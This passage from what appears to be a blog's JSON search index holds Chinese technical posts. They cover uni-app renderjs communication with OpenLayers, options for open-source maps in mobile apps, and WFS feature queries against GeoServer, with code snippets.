监听selectedFeature的变化,把变化传给视图层 --\u0026gt; \u0026lt;view :prop=\u0026#34;selectedFeature\u0026#34; :change:prop=\u0026#34;ol.toFeature\u0026#34;\u0026gt;\u0026lt;/view\u0026gt; \u0026lt;view class=\u0026#34;feature-list-view\u0026#34; @click=\u0026#34;showFeature(item)\u0026#34; v-for=\u0026#34;(item, index) in searchList\u0026#34; :key=\u0026#34;index\u0026#34; \u0026gt; \u0026lt;view class=\u0026#34;list-title\u0026#34;\u0026gt;{{item.values_.objectid}}\u0026lt;/view\u0026gt; \u0026lt;view class=\u0026#34;list-item\u0026#34;\u0026gt;{{item.values_.zt}}\u0026lt;/view\u0026gt; \u0026lt;/view\u0026gt; \u0026lt;/scroll-view\u0026gt; \u0026lt;/view\u0026gt; js （逻辑层）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;script\u0026gt; export default { data() { return { selectedFeature:{} } }, methods: { //接受视图层传过来的信息 setSearchList(e){ console.log(\u0026#34;option:\u0026#34;,e) this.searchList = e.option }, showFeature(item){ console.log(\u0026#34;show feature:\u0026#34;,item); this.selectedFeature = item; } } } \u0026lt;/script\u0026gt; renderjs（视图层）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;script module=\u0026#34;ol\u0026#34; lang=\u0026#34;renderjs\u0026#34;\u0026gt; export default { data() { return { selectedFeature:{} } }, methods: { queryFeature(event, ownerInstance){ ... // 调用 service 层的方法 ownerInstance.callMethod(\u0026#39;setSearchList\u0026#39;, { option: features }) ... }, toFeature(newValue, oldValue, ownerInstance, instance){ ... console.log(\u0026#34;newValue:\u0026#34;,newValue.values_.objectid) ... } } } \u0026lt;/script\u0026gt; （1）逻辑层到视图层的通信\n在html中写一个监听属性变化的监听器：\n1 \u0026lt;view :prop=\u0026#34;selectedFeature\u0026#34; :change:prop=\u0026#34;ol.toFeature\u0026#34;\u0026gt;\u0026lt;/view\u0026gt; 当点击结果列表中的某一项时，触发点击事件showFeature，执行逻辑层代码this.selectedFeature = item；此时selectedFeature的值发生了变化，从而触发监听selectedFeature的视图层事件ol.toFeature，在监听逻辑层属性变化的视图层函数中有几个参数：newValue、oldValue、ownerInstance、instance，其中的newValue即为改变后的属性值。此即逻辑层向视图层的通信。\n（2）视图层到逻辑层的通信\n首先在HTML中绑定视图层的函数ol.queryFeature，该函数有两个参数event和ownerInstance，使用ownerInstance的callMethod方法可调用逻辑层的方法setSearchList，callMethod的第二个参数为一个对象，逻辑层中setSearchList函数的形参便是视图层传递过来的值。此即视图层向逻辑层的通信。\n2 renderjs通信注意事项 （1）子组件通过事件向上传递值给父组件时，不能直接传值到视图层（renderjs模块），只能传值给逻辑层，因此需在逻辑层监听值的变化来触发视图层中的方法来执行事件或者改变视图层中的变量。\n（2）子组件中不可以通过事件向上传递，在父组件的逻辑层绑定视图层的方法进行调用。一种解决思路是在逻辑层添加一个触发视图层方法的触发器，在Vuex中监听该触发器属性的状态，逻辑层监听到触发器状态变化后便会调用视图层的方法。\n","permalink":"https://chance7bin.github.io/posts/map/uniapp%E5%8A%A0%E8%BD%BDopenlayers%E7%BB%84%E4%BB%B6%E9%80%9A%E4%BF%A1%E7%AF%87/","summary":"renderjs是uni-app中一个运行在视图层的JS。可在App端和H5页面上运行。renderjs的主要作用有2个： （1）极大地减少了","title":"uniapp加载openlayers——组件通信篇"},{"content":" uniapp中的APP开发使用开源地图的困难之处在于的APP端不支持document、window等对象的API，而开源地图的实例化又是需要通过dom获取到节点进行地图的创建，因此正常的uniapp开发是无法使用开源地图的，需要另辟蹊径。\n查阅相关资料，列举出了以下几种来解决移动端使用开源地图开发的方法，并就其使用方法以及可行性进行说明。\n==uni-app 中，没有 document！！！==\n方式一 使用uniapp中的renderjs进行开发\nhttps://uniapp.dcloud.net.cn/frame?id=renderjs\nrenderjs是一个运行在视图层的js。它比WXS更加强大。它只支持app-vue和h5。\n（WXS是一套运行在视图层的脚本语言，它的特点是运行在视图层。当需要避免逻辑层和渲染层交互通信折损时，可采用wxs。uni-app可以将wxs代码编译到微信小程序、QQ小程序、app-vue、H5上）\nrenderjs的主要作用有2个：\n大幅降低逻辑层和视图层的通讯损耗，提供高性能视图交互能力 在视图层操作dom，运行for web的js库 功能详解\n大幅降低逻辑层和视图层的通讯损耗，提供高性能视图交互能力 逻辑层和视图层分离有很多好处，但也有一个副作用是在造成了两层之间通信阻塞。尤其是小程序和App的Android端阻塞问题影响了高性能应用的制作。\nrenderjs运行在视图层，可以直接操作视图层的元素，避免通信折损。\n在视图层操作dom，运行for web的js库 官方不建议在uni-app里操作dom，但如果你不开发小程序，想使用一些操作了dom、window的库，其实可以使用renderjs来解决。 在app-vue环境下，视图层由webview渲染，而renderjs运行在视图层，自然可以操作dom和window。\n使用方法\n1 2 3 4 5 6 7 8 9 10 \u0026lt;script module=\u0026#34;test\u0026#34; lang=\u0026#34;renderjs\u0026#34;\u0026gt; export default { mounted() { // ... }, methods: { // ... } } \u0026lt;/script\u0026gt; 方式二（不建议） 用 html 5+ 或者 web-view内嵌h5去实现地图\n地图为单独的一个webview界面\nApp端的webview是非常强大的，可以更灵活的控制和拥有更丰富的API。\n数据目录那一块的功能要在内嵌的html上写 或者在uniapp弄一个侧边栏\n方式三（不建议） 由于目前市面上的app大部分是由原生和H5独立或混合编写，可对原生项目进行改造，实现原生(Android)和uni-app以及html5项目混编，使其能在iOS、Android、H5、小程序等多个平台运行，从而实现跨平台开发。\n第一种实现方式：在uni-app宿主项目中添加原生以及H5插件模块\n第二种实现方式：在原生宿主项目中运行uni-app以及H5插件模块\n","permalink":"https://chance7bin.github.io/posts/map/%E7%A7%BB%E5%8A%A8%E7%AB%AF%E7%9A%84%E5%9C%B0%E5%9B%BE%E5%BC%80%E5%8F%91/","summary":"uniapp中的APP开发使用开源地图的困难之处在于的APP端不支持document、window等对象的API，而开源地图的实例化又是需要","title":"移动端的地图开发"},{"content":"要素的查询、通过geserver进行的增删改 都是用到下图这个api，很重要！\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 queryFeature(){ //首先定义一个空的矢量图层，设置样式并添加到当前map中 var vectorSource = new VectorSource(); //设置查询参数与条件 var featureRequest = new WFS().writeGetFeature({ srsName: \u0026#39;EPSG:4326\u0026#39;,//坐标系统 featureNS: \u0026#39;http://onemap/ns\u0026#39;,//命名空间 URI featurePrefix: \u0026#39;onemap\u0026#39;,//工作区名称 featureTypes: [this.wfsSource],//查询图层，可以是同一个工作区下多个图层，逗号隔开 maxFeatures: 5000, outputFormat: \u0026#39;application/json\u0026#39;, filter: new like(\u0026#39;objectid\u0026#39;,\u0026#39;254*\u0026#39;)//前者是属性名，后者是对应值 }); fetch(api.domain + \u0026#39;/geoserver/\u0026#39; + \u0026#39;/onemap/ows?service=WFS\u0026#39;, {//geoserver wfs地址如localhost:8080/geoserver/wfs，我是8081 method: \u0026#39;POST\u0026#39;, body: new XMLSerializer().serializeToString(featureRequest) }).then(function(response) { return response.json(); }).then(function(json) { console.log(\u0026#34;feature json:\u0026#34;,json); }); } 上述代码进行模糊查询一直报错？？\nUncaught (in promise) SyntaxError: Unexpected token \u0026lt; in JSON at position 0 at __uniappview.html:0\nfetch的url写错了 ， 请求的地址和请求wfs资源的一样就不会报错\n1 api.domain + \u0026#39;/geoserver/onemap/ows?service=WFS\u0026amp;version=1.0.0\u0026amp;request=GetFeature\u0026amp;typeName=\u0026#39; + this.wfsSource + \u0026#39;\u0026amp;outputFormat=application%2Fjson\u0026amp;srsname=EPSG:4326\u0026#39; 注意： like 只可以对字符串属性进行模糊查找， 整型不可以\n","permalink":"https://chance7bin.github.io/posts/map/openlayers%E5%AF%B9%E8%A6%81%E7%B4%A0%E6%9C%8D%E5%8A%A1%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/","summary":"要素的查询、通过geserver进行的增删改 都是用到下图这个api，很重要！ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 queryFeature(){ //首先定义一","title":"openlayers对要素服务的增删改查"}]